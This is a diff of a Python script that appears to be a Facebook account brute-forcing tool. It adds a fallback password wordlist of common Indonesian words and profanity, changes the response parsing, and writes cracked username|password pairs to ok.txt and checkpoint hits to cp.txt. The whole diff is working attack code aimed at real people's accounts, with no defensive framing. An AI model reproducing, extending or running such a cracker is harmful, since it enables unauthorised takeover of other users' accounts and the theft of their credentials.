@@ -131,7 +131,7 @@ ________________________________________________________
 						
 				sys.stdout.write(
 					"\r\033[1;96m[*] \033[0m[\033[1;91m{0}\033[0m] Getting id ".format(
-						len(self.id)
+						len(self.id), id[0]
 				)) ; sys.stdout.flush()
 			
 		if ("Lihat selengkapnya" in str(bs)):
@@ -169,6 +169,14 @@ ________________________________________________________
 				users[3]+"123",
 				users[3]+"1234",
 			]
+		else:
+			pasw = [
+				'sayang', 'sayang123',
+				'bangsat','bangsat123',
+				'doraemon', 'doraemon123',
+				'kontol', 'kontol123',
+				'indonesia', 'indonesia123',
+			]
 		return pasw
 	
 	def results(self, ok, cp):
@@ -194,14 +202,18 @@ ________________________________________________________
 				req = requests.request(
 					"GET", url
 				).json()
-				if "www.facebook.com" in req["error_msg"]:
-					self.cekpoin.append(username+"|"+password)
-					open("cp.txt","a").write(str(username)+"|"+str(password)+"\n")
-					break
-				elif "access_token" in req:
-					self.ok.append(username+"|"+password)
-					open("ok.txt","a").write(str(username)+"|"+str(password)+"\n")
-					break
+				try:
+					if "www.facebook.com" in req["error_msg"]:
+						self.cekpoin.append(username+"|"+password)
+						open("cp.txt","a").write(str(username)+"|"+str(password)+"\n")
+						break
+				except:
+					try:
+						req["access_token"]
+						self.ok.append(username+"|"+password)
+						open("ok.txt","a").write(str(username)+"|"+str(password)+"\n")
+						break
+					except: pass
 			
 			sys.stdout.write(
 				"\r\033[1;96m[*] \033[0mCracking %s/%s Ok:-%s Cp:-%s "%(
@@ -217,4 +229,4 @@ try:
 	from multiprocessing.pool import ThreadPool
 	Brute().main()
 except Exception as E:
-	exit("\n\033[1;91m[*] \033[0mError :"+str(E))
+	exit("\n\033[1;91m[*] \033[0mError : "+str(E))
